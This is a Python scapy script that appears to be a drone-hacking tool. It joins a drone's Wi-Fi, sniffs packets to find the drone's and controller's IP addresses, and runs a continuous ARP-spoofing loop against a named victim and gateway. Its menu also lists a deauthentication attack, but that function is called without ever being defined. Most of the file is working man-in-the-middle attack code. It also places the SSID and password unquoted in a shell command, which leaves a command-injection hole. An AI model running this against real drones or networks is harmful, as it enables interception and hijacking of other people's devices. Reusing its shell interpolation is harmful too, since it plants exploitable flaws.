from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from time import sleep
import subprocess

conf.use_pcap = True

SSIDlist = []

def PrintList():
	print('\nWIFI-LIST')
	for i, ssid in enumerate(SSIDlist):
		print(i,':',ssid)

def find_WIFI():
	print('Finding WIFI...')
	command = ['airport', '-s']
	result = subprocess.run(command, capture_output=True, text=True)
	output = result.stdout.strip().split('\n')[1:]

	for line in output:
		wifi_info = line.split()
		ssid = wifi_info[0]
		SSIDlist.append(ssid)

	PrintList()
	i = int(input('select SSID!'))

	return i

def connectWIFI(sel):
	SSID = SSIDlist[sel]
	password = str(input('Input WIFI password!'))
	cmd = f"networksetup -setairportnetwork en0 {SSID} {password}"
	result = subprocess.run(cmd, shell=True, capture_output=True)
	if result.returncode == 0:
		sleep(15)
		print(f"Connected to {SSID} successfully!")
	else:
		print("Failed to connect to Wi-Fi")

def connectDrone():#WIFI connect
	sel = find_WIFI()
	connectWIFI(sel)


#find IP

def get_my_ip():
	return get_if_addr(conf.iface)

def showPacket(packet):
	src_ip = packet[0][1].src
	dst_ip = packet[0][1].dst
	prt = packet[0][1].proto
	#if(proto == 17)# Code 17 is UDP
	return src_ip, dst_ip

def sniffIP():#Get drone's IP and controller's IP!
	my_ip = get_my_ip()
	filter = f'ip and not src {my_ip} and not dst {my_ip}'
	captured_packets = sniff(filter = filter, prn = showPacket, count = 1)
	ips = [showPacket(packet) for packet in captured_packets]
	return ips[0]

#About ARPSpoofing!

def getMAC(ip):
	ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout = 5, retry = 3)
	for s, r in ans:
		return r.sprintf('%Ether.src%')

def poisonARP(scrip, targetip, targetmac):
	arp = ARP(op=2, psrc=scrip, pdst=targetip, hwdst=targetmac)
	send(arp)

def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
	arp1 = ARP(op = 2, pdst=victimip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc=gatewaymac)
	arp2 = ARP(op = 2, pdst=gatewayip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc=victimmac)
	send(arp1, count=3)
	send(arp2, count=3)

def ARPSpoof(gatewayip, victimip):

	gatewaymac = getMAC(gatewayip)
	victimmac = getMAC(victimip)

	if (victimmac == None) or (gatewaymac == None):
		print("Can't find MAC address!")
		return
	try:
		while True:
			poisonARP(gatewayip, victimip, victimmac)
			poisonARP(victimip, gatewayip, gatewaymac)
			sleep(3)
	except KeyboardInterrupt:
		restoreARP(victimip, gatewayip, victimmac, gatewaymac)
		print('ARP Spoofing finish... Restored ARP table....')

#About main

if __name__ == '__main__':
	print('1. connect Drone!\n2. Sniff IP!\n3. ARP Spoofing!')
	print('4. Print WIFI List!\n5. Print IP!')
	print('6. Deauth Attack!\n7. Get my ip!\n8. Set IP!')
	print('0. Exit!')
	gateway = '192.168.4.2'
	victim = '192.168.4.1'
	while(1):
		mode = int(input('Select your mode!'))
		if(mode == 1):
			connectDrone()
		elif(mode == 2):
			test = sniffIP()
			gateway = test[0]
			print(test)
		elif(mode == 3):
			ARPSpoof(gateway, victim)
		elif(mode == 4):
			PrintList()
		elif(mode == 5):
			print(gateway, victim)
		elif(mode == 6):
			sel = int(input('Select AP to send deauth packet'))
			Deauth(sel)
		elif(mode == 7):
			ip = get_my_ip()
			print(ip)
		elif(mode == 8):
			gateway = str(input('Insert gateway IP!'))
			victim = str(input('Insert victim IP'))	
		elif(mode == 0):
			break
